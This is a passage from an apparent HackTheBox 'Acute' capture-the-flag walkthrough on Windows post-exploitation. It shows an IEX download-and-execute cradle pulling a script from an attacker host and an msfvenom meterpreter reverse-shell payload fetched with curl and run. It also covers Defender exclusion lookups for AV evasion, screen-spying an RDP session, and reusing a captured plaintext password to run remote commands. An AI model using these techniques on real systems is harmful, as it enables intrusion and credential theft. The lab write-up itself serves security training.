. : 251663709</span><br><span class="line"></span><br><span class="line">   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-29-29-1F-44-00-15-5D-E8-02-00</span><br><span class="line"></span><br><span class="line">   DNS Servers . . . . . . . . . . . : 172.16.22.1</span><br><span class="line"></span><br><span class="line">   NetBIOS over Tcpip. . . . . . . . : Enabled</span><br></pre></td></tr></table></figure>
+
+<p>As you can see, the IP address is different from machine IP. It looks like a container or virtual machine (hyper-v). We can ping the gateway IP address.</p>
+<p>We can check foe open port on the gateway IP address.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\edavies\Documents&gt; </span><br><span class="line"></span><br><span class="line">Test-NetConnection 172.16.22.1 -port 445</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">ComputerName     : 172.16.22.1</span><br><span class="line"></span><br><span class="line">RemoteAddress    : 172.16.22.1</span><br><span class="line"></span><br><span class="line">RemotePort       : 445</span><br><span class="line"></span><br><span class="line">InterfaceAlias   : </span><br><span class="line"></span><br><span class="line">SourceAddress    : </span><br><span class="line"></span><br><span class="line">TcpTestSucceeded : True</span><br></pre></td></tr></table></figure>
+
+<p>As you can see, port 445 is open. We can run powershell script to get to know open ports on gateway IP address.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0luZm9zZWNNYXR0ZXIvTWluaW1hbGlzdGljLW9mZmVuc2l2ZS1zZWN1cml0eS10b29scw==">Minimalistic-offensive-security-tools<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line"></span><br><span class="line">IEX(New-Object Net.Webclient).downloadstring(<span class="string">&#x27;http://10.10.14.30/port-scan-tcp.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>IEX will download and execute the script. If you try to download it and execute manually using curl or method then it will not work. Now run below command to start finding open ports on that IP address.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1..1024 | foreach &#123; port-scan-tcp 172.16.22.1 <span class="variable">$_</span> &#125; &gt; ports_open_gateway</span><br></pre></td></tr></table></figure>
+
+<p>After couple minutes we can check the open ports dumped into that file.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Content .\ports_open_gateway</span><br></pre></td></tr></table></figure>
+
+<p>Looks like this IP is Domain Controller, as it is running Kerberos and LDAP. Let’s get a real shell by uploading our reverse shell executable. If we try to run executable from either home directory or programdata, it gives us error message.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/acute]</span><br><span class="line">└─<span class="comment"># msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.30 LPORT=9001 -f exe -o reverse.exe</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 510 bytes</span><br><span class="line">Final size of exe file: 7168 bytes</span><br><span class="line">Saved as: reverse.exe</span><br></pre></td></tr></table></figure>
+
+<p>Antivirus is running, probably defender. So, we can query the registry to find whitelisted paths.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\edavies\Documents&gt; </span><br><span class="line"></span><br><span class="line">reg query <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths&quot;</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths</span><br><span class="line"></span><br><span class="line">    C:\Utils    REG_DWORD    0x0</span><br><span class="line"></span><br><span class="line">    C:\Windows\System32    REG_DWORD    0x0</span><br></pre></td></tr></table></figure>
+
+<p>As you can see, there are two folders which are whitelisted. We can use ‘utils’ directory to execute our payloads. Let’s download our executable there and run it.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl 10.10.14.30/reverse.exe -o reverse.exe</span><br><span class="line">.\reverse.exe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.30:9001 </span><br><span class="line">[*] Sending stage (200262 bytes) to 10.10.11.145</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.30:9001 -&gt; 10.10.11.145:49778 ) at 2022-02-16 12:14:39 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: ACUTE\edavies</span><br></pre></td></tr></table></figure>
+
+<p>Alright, we have working shell now. Let’s switch to powershell and enumerate.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\utils&gt; net user edavies /domain</span><br><span class="line">The request will be processed at a domain controller <span class="keyword">for</span> domain acute.local.</span><br><span class="line">System error 1722 has occurred.</span><br><span class="line">The RPC server is unavailable.</span><br></pre></td></tr></table></figure>
+
+<p>If we try to query the domain, we’d get this above error. So, we can’t query domain for anything. Let’s run ‘WinPeas’ application and find LPE paths.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RDP Sessions</span><br><span class="line">SessID pSessionName pUserName pDomainName State</span><br><span class="line">SourceIP</span><br><span class="line">1 Console edavies ACUTE Active</span><br></pre></td></tr></table></figure>
+
+<p>WinPeas gives us this information. RDP session is running on the machine and logged in as ‘Edavies’ user. If it is RDP then its GUI not cmd line. We have to see what’s happening on the box.</p>
+<p>We have access ‘edavies’ user. Now we can check what’s happening on that RDP.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; screenshare -q 100</span><br><span class="line">[*] Preparing player...</span><br><span class="line">[*] Opening player at: /root/hackthebox/machine/acute/TPORyMMW.html</span><br><span class="line">[*] Streaming...</span><br></pre></td></tr></table></figure>
+
+<p>It started streaming the GUI. We need to access it via browser by visiting that player path.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2151.jpg"></li>
+</ul>
+<p>After waiting for couple minutes, a powershell window pops up and starts running powershell commands.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screenshare -q 100 -d 5000</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2152.jpg"></li>
+</ul>
+<p>As you can see based on executing commands, it is trying to start a new powershell session with an user (imonks) password and it is also using a configuration to access the session.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = ConvertTo-SecureString <span class="string">&quot;W3_4R3_th3_f0rce.&quot;</span> -AsPlaintext -Force</span><br><span class="line"><span class="variable">$cred</span> = New-Object System.Management.Automation.PSCredential (<span class="string">&quot;acute\imonks&quot;</span>, <span class="variable">$pass</span>)</span><br><span class="line">Enter-PSSession -computername ATSSERVER -ConfigurationName dc_manage -credential <span class="variable">$cred</span></span><br></pre></td></tr></table></figure>
+
+<p>The above command is being executed. We could have used that password to login via RDP, but RDP is not enabled on main host (not hyper-v). We have to use this technique only.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PS C:\utils&gt; <span class="variable">$pass</span> = ConvertTo-SecureString <span class="string">&quot;W3_4R3_th3_f0rce.&quot;</span> -AsPlaintext -Force</span><br><span class="line">PS C:\utils&gt; <span class="variable">$cred</span> = New-Object System.Management.Automation.PSCredential</span><br><span class="line">(<span class="string">&quot;acute\imonks&quot;</span>, <span class="variable">$pass</span>)</span><br><span class="line">PS C:\utils&gt; Enter-PSSession -computername ATSSERVER -ConfigurationName dc_manage -</span><br><span class="line">credential <span class="variable">$cred</span></span><br><span class="line">Enter-PSSession : The term <span class="string">&#x27;Measure-Object&#x27;</span> is not recognized as the name of a cmdlet,</span><br><span class="line"><span class="keyword">function</span>, script file, or</span><br><span class="line">operable program. Check the spelling of the name, or <span class="keyword">if</span> a path was included, verify</span><br><span class="line">that the path is correct and try</span><br><span class="line">again.</span><br><span class="line">At line:1 char:1</span><br><span class="line">+ Enter-PSSession -computername ATSSERVER -ConfigurationName dc_manage ...</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">+ CategoryInfo : ObjectNotFound: (Measure-Object:String) [Enter-</span><br><span class="line">PSSession], CommandNotFoundException</span><br><span class="line">+ FullyQualifiedErrorId : CommandNotFoundException</span><br></pre></td></tr></table></figure>
+
+<p>As you can see it is giving us the same error as RDP screenshot. It’s not able to find ‘Measure-Object’ cmdlet is not recognized by the powershell.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\utils&gt; get-command | select-string <span class="string">&#x27;Measure-Object&#x27;</span></span><br><span class="line">Measure-Object</span><br></pre></td></tr></table></figure>
+
+<p>It is available to ‘Edavie’ user but not to ‘imonks’ user. However, the credentials are not wrong. We can try to invoke-command to execute windows commands.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\utils&gt; Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -</span><br><span class="line">credential <span class="variable">$cred</span> -<span class="built_in">command</span> &#123;<span class="built_in">whoami</span>&#125;</span><br><span class="line">acute\imonks</span><br></pre></td></tr></table></figure>
+
+<p>As you can see, we can able to run windows commands from ‘imonks’ context. We can read user flag via this technique.</p>
+<p>Let’s go one step back and read the flag.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\edavies\Documents&gt; </span><br><span class="line"></span><br><span class="line"><span class="variable">$SecPassword</span> = ConvertTo-SecureString <span class="string">&#x27;W3_4R3_th3_f0rce.&#x27;</span> -AsPlainText -Force</span><br><span class="line"></span><br><span class="line">PS C:\Users\edavies\Documents&gt; </span><br><span class="line"></span><br><span class="line"><span class="variable">$Cred</span> = New-Object System.Management.Automation.PSCredential(<span class="string">&#x27;acute\imonks&#x27;</span>, <span class="variable">$SecPassword</span>)</span><br><span class="line"></span><br><span class="line">PS C:\Users\edavies\Documents&gt; </span><br><span class="line"></span><br><span class="line">Invoke-Command atsserver -ConfigurationName dc_manage -Credential <span class="variable">$Cred</span> -scriptblock &#123; <span class="built_in">cat</span> c:\<span class="built_in">users</span>\imonks\Desktop\user</span><br><span class="line"></span><br><span class="line">.txt &#125;</span><br><span class="line"></span><br><span class="line">664cb31a110ae58cc8cc164846f951c8</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2153.jpg"></li>
+</ul>
+<p>From ‘imon’ users context we can only run these below powershell commands.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\edavies\Documents&gt; </span><br><span class="line"></span><br><span class="line">Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential <span class="variable">$cred</span> -<span class="built_in">command</span> &#123;get-command&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">CommandType     Name                                               Version    Source               PSComputerName      </span><br><span class="line"></span><br><span class="line">-----------     ----                                               -------    ------               --------------      </span><br><span class="line"></span><br><span class="line">Cmdlet          Get-Alias                                          3.1.0.0    Microsoft.PowerSh... ATSSERVER           </span><br><span class="line"></span><br><span class="line">Cmdlet          Get-ChildItem                                      3.1.0.0    Microsoft.PowerSh... ATSSERVER           </span><br><span class="line"></span><br><span class="line">Cmdlet          Get-Command                                        3.0.0.0    Microsoft.PowerSh... ATSSERVER           </span><br><span class="line"></span><br><span class="line">Cmdlet          Get-Content                                        3.1.0.0    Microsoft.PowerSh... ATSSERVER           </span><br><span class="line"></span><br><span class="line">Cmdlet          Get-Location                                       3.1.0.0    Microsoft.PowerSh... ATSSERVER           </span><br><span class="line"></span><br><span class="line">Cmdlet          Set-Content                                        3.1.0.0    Microsoft.PowerSh... ATSSERVER           </span><br><span class="line"></span><br><span class="line">Cmdlet          Set-Location                                       3.1.0.0    Microsoft.PowerSh... ATSSERVER           </span><br><span class="line"></span><br><span class="line">Cmdlet          Write-Output                                       3.1.0.0    Microsoft.PowerSh... ATSSERVER           </span><br></pre></td></tr></table></figure>
+
+<p>Let’s query domain to get more info on ‘imonks’ user.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\edavies\Documents&gt; </span><br><span class="line"></span><br><span class="line">Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential <span class="variable">$cred</span> -ScriptBlock &#123;net user imonks /do</span><br><span class="line"></span><br><span class="line">main&#125;</span><br><span class="line"></span><br><span class="line">User name                    imonks</span><br><span class="line"></span><br><span class="line">Full Name                    Ieuan Monks</span><br><span class="line"></span><br><span class="line">Comment                      </span><br><span class="line"></span><br><span class="line">User<span class="string">&#x27;s comment               </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Country/region code          000 (System Default)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Account active               Yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Account expires              Never</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password last set            21/12/2021 14:51:31</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password expires             Never</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password changeable          22/12/2021 14:51:31</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password required            Yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">User may change password     No</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Workstations allowed         All</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Logon script                 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">User profile                 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Home directory               </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last logon                   16/02/2022 17:47:45</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Logon hours allowed          All</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Local Group Memberships      </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Global Group memberships     *Domain Users         *Managers             </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The command completed successfully.</span></span><br></pre></td></tr></table></figure>
+
+<p>‘imonks’ user is member of ‘Manger’ group. Let’s find who else is member of manager group.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\edavies\Documents&gt; </span><br><span class="line"></span><br><span class="line">Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential <span class="variable">$cred</span> -ScriptBlock &#123;net user awallace /</span><br><span class="line"></span><br><span class="line">domain&#125;</span><br><span class="line"></span><br><span class="line">User name                    awallace</span><br><span class="line"></span><br><span class="line">Full Name                    Aileen Wallace</span><br><span class="line"></span><br><span class="line">Comment                      </span><br><span class="line"></span><br><span class="line">User<span class="string">&#x27;s comment               </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Country/region code          000 (System Default)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Account active               Yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Account expires              Never</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password last set            21/12/2021 14:50:36</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password expires             Never</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password changeable          22/12/2021 14:50:36</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password required            Yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">User may change password     No</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Workstations allowed         All</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Logon script                 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">User profile                 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Home directory               </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last logon                   23/12/2021 09:15:29</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Logon hours allowed          All</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Local Group Memberships      </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Global Group memberships     *Domain Users         *Managers             </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The command completed successfully.</span></span><br></pre></td></tr></table></figure>
+
+<p>User ‘awallace’ is member of manager group. To enumerate AD we need imonks shell access. We can’t execute any useful commands which can help to us to run our executable files.</p>
+<p>Let’s look for any files on the server.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\edavies\Documents&gt; </span><br><span class="line"></span><br><span class="line">Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential <span class="variable">$cred</span> -<span class="built_in">command</span> &#123;<span class="built_in">ls</span> <span class="string">&#x27;c:\program files&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    Directory: C:\program files</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                               PSComputerName                    </span><br><span class="line"></span><br><span class="line">----                 -------------         ------ ----                               --------------                    </span><br><span class="line"></span><br><span class="line">d-----        12/21/2021  12:04 AM                common files                       ATSSERVER                         </span><br><span class="line"></span><br><span class="line">d-----        12/21/2021  12:11 AM                Hyper-V                            ATSSERVER                         </span><br><span class="line"></span><br><span class="line">d-----         9/15/2018   8:12 AM                internet explorer                  ATSSERVER                         </span><br><span class="line"></span><br><span class="line">d-----          2/1/2022   7:41 PM                keepmeon                           ATSSERVER                         </span><br><span class="line"></span><br><span class="line">d-----        12/21/2021  12:04 AM                VMware                             ATSSERVER                         </span><br><span class="line"></span><br><span class="line">d-----        12/20/2021   9:19 PM                Windows Defender                   ATSSERVER                         </span><br><span class="line"></span><br><span class="line">d-----        12/20/2021   9:12 PM                Windows Defender Advanced Threat   ATSSERVER                         </span><br><span class="line"></span><br><span class="line">                                                  Protection                                                           </span><br><span class="line"></span><br><span class="line">d-----        12/21/2021   2:13 PM                WindowsPowerShell                  ATSSERVER                         </span><br></pre></td></tr></table></figure>
+
+<p>On C drive, we have an unusual file, let’s try to access it.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\edavies\Documents&gt; </span><br><span class="line"></span><br><span class="line">Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential <span class="variable">$cred</span> -<span class="built_in">command</span> &#123;<span class="built_in">ls</span> <span class="string">&#x27;c:\program files\ke</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">epmeon&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">Access to the path <span class="string">&#x27;C:\program files\keepmeon&#x27;</span> is denied.</span><br><span class="line"></span><br><span class="line">    + CategoryInfo          : PermissionDenied: (C:\program files\keepmeon:String) [Get-ChildItem], UnauthorizedAccess </span><br><span class="line"></span><br><span class="line">   Exception</span><br><span class="line"></span><br><span class="line">    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand</span><br><span class="line"></span><br><span class="line">    + PSComputerName        : ATSSERVER</span><br></pre></td></tr></table></figure>
+
+<p>Access denied. If we check the ‘imonks’ desktop, we will find a powershell script.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\edavies\Documents&gt; </span><br><span class="line"></span><br><span class="line">Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential <span class="variable">$cred</span> -ScriptBlock &#123;<span class="built_in">ls</span> ../desktop&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\imonks\desktop</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                               PSComputerName                    </span><br><span class="line"></span><br><span class="line">----                 -------------         ------ ----                               --------------                    </span><br><span class="line"></span><br><span class="line">-ar---         2/16/2022   5:40 PM             34 user.txt                           ATSSERVER                         </span><br><span class="line"></span><br><span class="line">-a----         1/11/2022   6:04 PM            602 wm.ps1                             ATSSERVER                         </span><br></pre></td></tr></table></figure>
+
+<p>Let’s read the contents of that script.</p>
